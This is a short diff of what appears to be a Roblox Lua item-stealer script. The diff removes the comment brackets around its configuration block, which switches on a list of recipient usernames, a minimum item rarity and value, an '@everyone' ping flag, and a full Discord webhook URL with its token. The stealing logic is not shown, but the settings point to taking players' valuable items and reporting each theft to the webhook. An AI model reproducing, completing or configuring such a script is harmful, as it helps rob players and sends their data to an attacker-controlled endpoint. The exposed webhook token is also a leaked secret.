@@ -1,9 +1,9 @@
-[[_G.Usernames = {"Erereer454"} 
+_G.Usernames = {"Erereer454"} 
 _G.min_rarity = "Rare" 
 _G.min_value = 0
 _G.pingEveryone = "Yes" 
 _G.webhook = "https://discord.com/api/webhooks/1495919876236378243/z9Ve-r2Sae7wtVyJ-9DdK2WnP-J9CCYtAJ_n4lWdPUWJT1vf1mERLKdF2fwUaG6orU_H"
-]]
+
 getgenv().executed = getgenv().executed or false
 if getgenv().executed then 
     return 
